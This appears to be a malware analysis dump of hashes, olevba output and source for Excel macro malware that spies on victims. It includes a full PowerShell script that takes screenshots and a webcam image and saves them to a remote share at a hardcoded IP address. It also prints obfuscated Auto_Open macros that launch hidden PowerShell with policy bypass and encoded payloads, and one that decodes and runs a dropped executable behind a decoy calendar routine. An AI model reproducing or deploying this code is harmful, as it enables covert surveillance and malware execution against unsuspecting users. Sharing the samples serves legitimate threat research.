# uploaded by @JohnLaTwC
# XLS macro malware that takes webcam pictures

1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366
45f1902f70e7d1a0a29c7919110b58cb03d4f4e688606a1123cbc43b6499e648
51050166eb992f073be6618115b91031a545488af9fcc26326a7309b8b66e365
533632514704e85f618237b9327ec54fd09471ec73e2a2e3ebe1824ae2c4f4aa
8c930e756001bb46deb6c98f3a5504f46fe049976ea25a33f418e647b75b8c00
a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f
a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938
e17c7e9eca5ffd6cacc4e66f99b569a15e6eb37432f2424bb70a23afb6145cb3
e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210


#webcam PowerShell
#######################################################################################
# RT_Watcher.ps1 - grabs screenshots and 1 webcam image
# Captures 5 screenshots and outputs to RT X, C:\HP or C:\. If not available, exits. =(
# Delay time set to 30 seconds. 
# Written by: sil3n7h
# RT_Watcher.ps1 - grabs screenshots and 1 webcam image
#######################################################################################

$username=$env:UserName
Write-Output $username	
$hname=$env:computername
Write-Output $hname	

$i=1
While ($i -le 5){

$time=Get-Date -format 'dd-MMM-yyyy-HH-mm-ss'
Write-Output $time

# Check to see if path to RED X exists
if (Test-Path \\143.16.176.125\x) {
	$File = '\\143.16.176.125\x\' + $username + '_' + $hname + '_' + $time + '.jpg'
	$BasePath = '\\143.16.176.125\x\' + $username + '_' + $hname + '_'
}
ElseIf (Test-Path C:\HP) {
	$File = 'C:\HP\' + $username + '_' + $hname + '_' + $time + '.jpg'
	$BasePath = 'C:\HP\' + $username + '_' + $hname + '_'
}
ElseIf (Test-Path C:) {
	$File = 'C:\' + $username + '_' + $hname + '_' + $time + '.jpg'
	$BasePath = 'C:\' + $username + '_' + $hname + '_'
}
Else {
	# You are shit out of luck
	exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

# Gather Screen resolution information
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# Create bitmap using the top-left and bottom-right bounds
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height

# Create Graphics object
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)

# Capture screen
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

# Save to file
$bitmap.Save($File, ([system.drawing.imaging.imageformat]::jpeg)) 
Write-Output 'Screenshot saved to:'
Write-Output $File

$graphic.dispose()
$bitmap.dispose()

Start-Sleep -Seconds 30
$i++
}

#######################################################################################
# Then attempts to capture webcam image. Shoddy code, sorry.
# Requires -version 2.0 
#######################################################################################
   
   $source=@"
using System; 
using System.Collections.Generic; 
using System.Text; 
using System.Collections; 
using System.Runtime.InteropServices; 
using System.ComponentModel; 
using System.Data; 
using System.Drawing; 
using System.Windows.Forms; 
 
namespace WebCamLib 
{ 
    public class Device 
    { 
        private const short WM_CAP = 0x400; 
        private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
        private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
        private const int WM_CAP_EDIT_COPY = 0x41e; 
        private const int WM_CAP_SET_PREVIEW = 0x432; 
        private const int WM_CAP_SET_OVERLAY = 0x433; 
        private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
        private const int WM_CAP_SET_SCALE = 0x435; 
        private const int WS_CHILD = 0x40000000; 
        private const int WS_VISIBLE = 0x10000000; 
 
        [DllImport("avicap32.dll")] 
        protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
            int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
 
        [DllImport("user32", EntryPoint = "SendMessageA")] 
        protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
 
        [DllImport("user32")] 
        protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
 
        [DllImport("user32")] 
        protected static extern bool DestroyWindow(int hwnd); 
                 
        int index; 
        int deviceHandle; 
 
        public Device(int index) 
        { 
            this.index = index; 
        } 
 
        private string _name; 
 
        public string Name 
        { 
            get { return _name; } 
            set { _name = value; } 
        } 
 
        private string _version; 
 
        public string Version 
        { 
            get { return _version; } 
            set { _version = value; } 
        } 
 
        public override string ToString() 
        { 
            return this.Name; 
        } 
 
        public void Init(int windowHeight, int windowWidth, int handle) 
        { 
            string deviceIndex = Convert.ToString(this.index); 
            deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
 
            if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
            { 
                SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
                SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
                SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
                SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
            } 
        } 
 
        public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
        { 
            Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
        } 
         
        public void CopyC() 
        { 
           SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
        } 
 
        public void Stop() 
        { 
            SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
            DestroyWindow(deviceHandle); 
        } 
    } 
     
    public class DeviceManager 
    { 
        [DllImport("avicap32.dll")] 
        protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
            [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
           int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
 
        static ArrayList devices = new ArrayList(); 
 
        public static Device[] GetAllDevices() 
        { 
            String dName = "".PadRight(100); 
            String dVersion = "".PadRight(100); 
 
            for (short i = 0; i < 10; i++) 
            { 
                if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
                { 
                    Device d = new Device(i); 
                    d.Name = dName.Trim(); 
                    d.Version = dVersion.Trim(); 
                    devices.Add(d);                     
                } 
            } 
 
            return (Device[])devices.ToArray(typeof(Device)); 
        } 
 
        public static Device GetDevice(int deviceIndex) 
        { 
            return (Device)devices[deviceIndex]; 
        } 
    } 
} 
"@

$picCapture = New-Object System.Windows.Forms.PictureBox 

Add-Type -AssemblyName System.Drawing      
Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing 

try {

$time=Get-Date -format 'dd-MMM-yyyy-HH-mm-ss'
       
#Get list of webcam devices
$devices = [WebCamLib.DeviceManager]::GetAllDevices() 
foreach ($d in $devices) 
{ 
   #$cmbDevices.Items.Add($d) | Out-Null 
} 

$firstd = [WebCamLib.DeviceManager]::GetDevice(0)
$firstd.ShowWindow($picCapture) 

[windows.forms.clipboard]::clear() 
    $firstd.CopyC()      
    $bitmap = [Windows.Forms.Clipboard]::GetImage()  
    $newpath = $BasePath + $time + '.jpg'
	 
    if ($bitmap -ne $null) 
    {               
	   $bitmap.Save($newpath, ([system.drawing.imaging.imageformat]::jpeg)) 
       Write-host 'Snap taken '$File'' 
       $bitmap.dispose() 
       [windows.forms.clipboard]::clear() 
    } 
    else 
    { 
       write-host 'no image on clipboard' 
    } 
	
$picCapture.BackColor = [System.Drawing.Color]::FromArgb(255,0,0,0) 
$firstd.Stop()

exit

}
catch {
break
}

exit
 



# macro source
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASIH--- 1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366
===============================================================================
FILE: 1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: 1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366 - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: 1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: 1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call e3OljP3R

    Application.ScreenUpdating = False
    Sheets("Agenda").Visible = True
    Sheets("Sheet1").Visible = False
    Application.ScreenUpdating = True
End Sub


Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Sub e3OljP3R()
    Dim x As String
    x = GetVal(11713, 11713, 203)
    x = Replace(x, """", "\""")
    Dim c As String
    c = "powershell.exe -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
    Set s = CreateObject("wscript.shell")
    s.Run c, 0
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: 1509fc5354735f98c7c1cbf419baf615da70142fe8939fd8c33095f25ae30366 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)

Attribute VB_Name SHA1  
4E7685D97A25C40003C29B6D075E3A7D87C7D5AC
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
?            45f1902f70e7d1a0a29c7919110b58cb03d4f4e688606a1123cbc43b6499e6481 - File not found
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASIH--- 51050166eb992f073be6618115b91031a545488af9fcc26326a7309b8b66e365
===============================================================================
FILE: 51050166eb992f073be6618115b91031a545488af9fcc26326a7309b8b66e365
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: 51050166eb992f073be6618115b91031a545488af9fcc26326a7309b8b66e365 - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: 51050166eb992f073be6618115b91031a545488af9fcc26326a7309b8b66e365 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: 51050166eb992f073be6618115b91031a545488af9fcc26326a7309b8b66e365 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call eLIyTUc5

End Sub


Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Sub eLIyTUc5()
    Dim x As String
    x = GetVal(44692, 44693, 236)
    x = Replace(x, """", "\""")
    Dim c As String
    c = "powershell.exe" & x
    wscript.Shell.Run c, 0
End Sub



Attribute VB_Name SHA1  
2BE65C78A37EA85C015905714FE74D0B85FE7A33
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASIH--- 533632514704e85f618237b9327ec54fd09471ec73e2a2e3ebe1824ae2c4f4aa
===============================================================================
FILE: 533632514704e85f618237b9327ec54fd09471ec73e2a2e3ebe1824ae2c4f4aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: 533632514704e85f618237b9327ec54fd09471ec73e2a2e3ebe1824ae2c4f4aa - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: 533632514704e85f618237b9327ec54fd09471ec73e2a2e3ebe1824ae2c4f4aa - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: 533632514704e85f618237b9327ec54fd09471ec73e2a2e3ebe1824ae2c4f4aa - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call e3OljP3R

End Sub


Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Sub e3OljP3R()
    Dim x As String
    x = GetVal(11713, 11713, 203)
    x = Replace(x, """", "\""")
    Dim c As String
    c = "powershell.exe -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
    Set s = CreateObject("wscript.shell")
    s.Run c, 0
End Sub



Attribute VB_Name SHA1  
C85C0562B388419F2B8DEB80A8C56FB081C2E58B
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MAS-H--- 8c930e756001bb46deb6c98f3a5504f46fe049976ea25a33f418e647b75b8c00
===============================================================================
FILE: 8c930e756001bb46deb6c98f3a5504f46fe049976ea25a33f418e647b75b8c00
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: 8c930e756001bb46deb6c98f3a5504f46fe049976ea25a33f418e647b75b8c00 - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: 8c930e756001bb46deb6c98f3a5504f46fe049976ea25a33f418e647b75b8c00 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: 8c930e756001bb46deb6c98f3a5504f46fe049976ea25a33f418e647b75b8c00 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call SqP5snBH

End Sub


Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Function rndname()
    Dim r As String
    Dim i As Integer
     
    For i = 1 To 8
        If i Mod 2 = 0 Then
            r = Chr(Int((90 - 65 + 1) * Rnd + 65)) & r
        Else
            r = Int((9 * Rnd) + 1) & r
        End If
    Next i
    rndname = r
End Function


Function dec(b64)
    Dim DM, EL
    Set DM = CreateObject(Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(46) & Chr(88) & Chr(77) & Chr(76) & Chr(68) & Chr(79) & Chr(77))
    Set EL = DM.createElement(Chr(116) & Chr(109) & Chr(112))
    EL.DataType = Chr(98) & Chr(105) & Chr(110) & Chr(46) & Chr(98) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52)
    EL.Text = b64
    dec = EL.NodeTypedValue
End Function


Sub rit(file, bytes)
    Dim b
    Set b = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(83) & Chr(116) & Chr(114) & Chr(101) & Chr(97) & Chr(109))
    b.Type = 1
    b.Open
    b.Write bytes
    b.SaveToFile file, 2
End Sub


Sub SqP5snBH()
    Dim p, pth As String
    Dim b
    pth = Application.UserLibraryPath & rndname & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    p = GetVal(44059, 44274, 169)
    b = dec(p)
    Call rit(pth, b)
    Shell (pth)
End Sub



Attribute VB_Name SHA1  
F312894D6F03BCE444A1EBC834C61A79C5E82166
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASIHB-- a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f
===============================================================================
FILE: a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call LinesOfBusiness.YELc22Qw

CalendarMaker

End Sub

Public Function CalendarMaker()

       ' Unprotect sheet if had previous calendar to prevent error.
       ActiveSheet.Protect DrawingObjects:=False, Contents:=False, _
          Scenarios:=False
       ' Prevent screen flashing while drawing calendar.
       Application.ScreenUpdating = False
       ' Set up error trapping.
       'On Error GoTo MyErrorTrap
       With Range("a1")
          If .MergeCells Then
             .MergeArea.UnMerge
          Else
             MsgBox "not merged"
          End If
       End With
       ' Clear area a1:g14 including any previous calendar.
       Range("a1:g14").Clear
       ' Use InputBox to get desired month and year and set variable
       ' MyInput.
       ''MyInput = InputBox("Type in Month and year for Calendar ")
       ' Allow user to end macro with Cancel in InputBox.
       ''If MyInput = "" Then Exit Sub
       MyInput = "09/2016"
       ' Get the date value of the beginning of inputted month.
       StartDay = DateValue(MyInput)
       ' Check if valid date but not the first of the month
       ' -- if so, reset StartDay to first day of month.
       If Day(StartDay) <> 1 Then
           StartDay = DateValue(Month(StartDay) & "/1/" & _
               Year(StartDay))
       End If
       ' Prepare cell for Month and Year as fully spelled out.
       Range("a1").NumberFormat = "mmmm yyyy"
       ' Center the Month and Year label across a1:g1 with appropriate
       ' size, height and bolding.
       With Range("a1:g1")
           .HorizontalAlignment = xlCenterAcrossSelection
           .VerticalAlignment = xlCenter
           .Font.Size = 18
           .Font.Bold = True
           .RowHeight = 35
       End With
       ' Prepare a2:g2 for day of week labels with centering, size,
       ' height and bolding.
       With Range("a2:g2")
           .ColumnWidth = 11
           .VerticalAlignment = xlCenter
           .HorizontalAlignment = xlCenter
           .VerticalAlignment = xlCenter
           .Orientation = xlHorizontal
           .Font.Size = 12
           .Font.Bold = True
           .RowHeight = 20
       End With
       ' Put days of week in a2:g2.
       Range("a2") = "Sunday"
       Range("b2") = "Monday"
       Range("c2") = "Tuesday"
       Range("d2") = "Wednesday"
       Range("e2") = "Thursday"
       Range("f2") = "Friday"
       Range("g2") = "Saturday"
       ' Prepare a3:g7 for dates with left/top alignment, size, height
       ' and bolding.
       With Range("a3:g8")
           .HorizontalAlignment = xlRight
           .VerticalAlignment = xlTop
           .Font.Size = 18
           .Font.Bold = True
           .RowHeight = 21
       End With
       ' Put inputted month and year fully spelling out into "a1".
       Range("a1").Value = Application.Text(MyInput, "mmmm yyyy")
       ' Set variable and get which day of the week the month starts.
       DayofWeek = Weekday(StartDay)
       ' Set variables to identify the year and month as separate
       ' variables.
       CurYear = Year(StartDay)
       CurMonth = Month(StartDay)
       ' Set variable and calculate the first day of the next month.
       FinalDay = DateSerial(CurYear, CurMonth + 1, 1)
       ' Place a "1" in cell position of the first day of the chosen
       ' month based on DayofWeek.
       Select Case DayofWeek
           Case 1
               Range("a3").Value = 1
           Case 2
               Range("b3").Value = 1
           Case 3
               Range("c3").Value = 1
           Case 4
               Range("d3").Value = 1
           Case 5
               Range("e3").Value = 1
           Case 6
               Range("f3").Value = 1
           Case 7
               Range("g3").Value = 1
       End Select
       ' Loop through range a3:g8 incrementing each cell after the "1"
       ' cell.
       For Each cell In Range("a3:g8")
           RowCell = cell.Row
           ColCell = cell.Column
           ' Do if "1" is in first column.
           If cell.Column = 1 And cell.Row = 3 Then
           ' Do if current cell is not in 1st column.
           ElseIf cell.Column <> 1 Then
               If cell.Offset(0, -1).Value >= 1 Then
                   cell.Value = cell.Offset(0, -1).Value + 1
                   ' Stop when the last day of the month has been
                   ' entered.
                   If cell.Value > (FinalDay - StartDay) Then
                       cell.Value = ""
                       ' Exit loop when calendar has correct number of
                       ' days shown.
                       Exit For
                   End If
               End If
           ' Do only if current cell is not in Row 3 and is in Column 1.
           ElseIf cell.Row > 3 And cell.Column = 1 Then
               cell.Value = cell.Offset(-1, 6).Value + 1
               ' Stop when the last day of the month has been entered.
               If cell.Value > (FinalDay - StartDay) Then
                   cell.Value = ""
                   ' Exit loop when calendar has correct number of days
                   ' shown.
                   Exit For
               End If
           End If
       Next

       ' Create Entry cells, format them centered, wrap text, and border
       ' around days.
       For x = 0 To 5
           Range("A4").Offset(x * 2, 0).EntireRow.Insert
           With Range("A4:G4").Offset(x * 2, 0)
               .RowHeight = 65
               .HorizontalAlignment = xlCenter
               .VerticalAlignment = xlTop
               .WrapText = True
               .Font.Size = 10
               .Font.Bold = False
               ' Unlock these cells to be able to enter text later after
               ' sheet is protected.
               .Locked = False
           End With
           ' Put border around the block of dates.
           With Range("A3").Offset(x * 2, 0).Resize(2, _
           7).Borders(xlLeft)
               .Weight = xlThick
               .ColorIndex = xlAutomatic
           End With

           With Range("A3").Offset(x * 2, 0).Resize(2, _
           7).Borders(xlRight)
               .Weight = xlThick
               .ColorIndex = xlAutomatic
           End With
           Range("A3").Offset(x * 2, 0).Resize(2, 7).BorderAround _
              Weight:=xlThick, ColorIndex:=xlAutomatic
       Next
       If Range("A13").Value = "" Then Range("A13").Offset(0, 0) _
          .Resize(2, 8).EntireRow.Delete
       ' Turn off gridlines.
       ActiveWindow.DisplayGridlines = False
       ' Protect sheet to prevent overwriting the dates.
       ActiveSheet.Protect DrawingObjects:=True, Contents:=True, _
          Scenarios:=True

       ' Resize window to show all of calendar (may have to be adjusted
       ' for video configuration).
       ActiveWindow.WindowState = xlMaximized
       ActiveWindow.ScrollRow = 1

       ' Allow screen to redraw with calendar showing.
       Application.ScreenUpdating = True
       ' Prevent going to error trap unless error found by exiting Sub
       ' here.
       Exit Function
   ' Error causes msgbox to indicate the problem, provides new input box,
   ' and resumes at the line that caused the error.
MyErrorTrap:
       MsgBox "You may not have entered your Month and Year correctly." _
           & Chr(13) & "Spell the Month correctly" _
           & " (or use 3 letter abbreviation)" _
           & Chr(13) & "and 4 digits for the Year"
       MyInput = InputBox("Type in Month and year for Calendar")
       If MyInput = "" Then Exit Function
       Resume
End Function

-------------------------------------------------------------------------------
VBA MACRO LinesOfBusiness.bas 
in file: a0c18bb5051fe67f1b767403876eb0cfe20b2e0a029d52e05b75d40fcbf4139f - OLE stream: u'_VBA_PROJECT_CUR/VBA/LinesOfBusiness'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Function rndname()
    Dim r As String
    Dim i As Integer
     
    For i = 1 To 8
        If i Mod 2 = 0 Then
            r = Chr(Int((90 - 65 + 1) * Rnd + 65)) & r
        Else
            r = Int((9 * Rnd) + 1) & r
        End If
    Next i
    rndname = r
End Function


Sub YELc22Qw()
    Dim x, c As String
    x = GetVal(33761, 33761, 218)
    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "l.eXe -nop -noni " & _
    "-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & _
    "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & "" & _
    " -e" & "nc " & x
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run c, 0
End Sub




Attribute VB_Name SHA1  
E228B03FCA9356A8B440EEF971348F985C536FD3
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASIH--- a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938
===============================================================================
FILE: a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938 - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call LinesOfBusiness.e3OljP3R

    Application.ScreenUpdating = False
    Sheets("Agenda").Visible = True
    Sheets("Sheet1").Visible = False
    Application.ScreenUpdating = True
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LinesOfBusiness.bas 
in file: a89ed8a2f30adb66b9c98bbf20422ecae903510f40a7d179f0629a27975a1938 - OLE stream: u'_VBA_PROJECT_CUR/VBA/LinesOfBusiness'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function

Function rndname()
    Dim r As String
    Dim i As Integer
     
    For i = 1 To 8
        If i Mod 2 = 0 Then
            r = Chr(Int((90 - 65 + 1) * Rnd + 65)) & r
        Else
            r = Int((9 * Rnd) + 1) & r
        End If
    Next i
    rndname = r
End Function

Sub e3OljP3R()
    Dim x As String
    x = GetVal(11713, 11713, 203)
    'x = Replace(x, """", "\""")
    Dim c As String
    'c = "powershell.exe -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
    c = "pow" & Chr(101) & "rshell.exe -nop -noni -windowstyle hidden -exec bypass -enc " & x
    'c = "powershell.exe -nop -noni -exec bypass -enc " & x
    Set s = CreateObject("wscript.shell")
    s.Run c, 0
End Sub

Attribute VB_Name SHA1  
36383242A3D50644CEC3745B26289D842616D74F
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MAS-H--- e17c7e9eca5ffd6cacc4e66f99b569a15e6eb37432f2424bb70a23afb6145cb3
===============================================================================
FILE: e17c7e9eca5ffd6cacc4e66f99b569a15e6eb37432f2424bb70a23afb6145cb3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: e17c7e9eca5ffd6cacc4e66f99b569a15e6eb37432f2424bb70a23afb6145cb3 - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: e17c7e9eca5ffd6cacc4e66f99b569a15e6eb37432f2424bb70a23afb6145cb3 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: e17c7e9eca5ffd6cacc4e66f99b569a15e6eb37432f2424bb70a23afb6145cb3 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    Call cBDo45Rt

End Sub


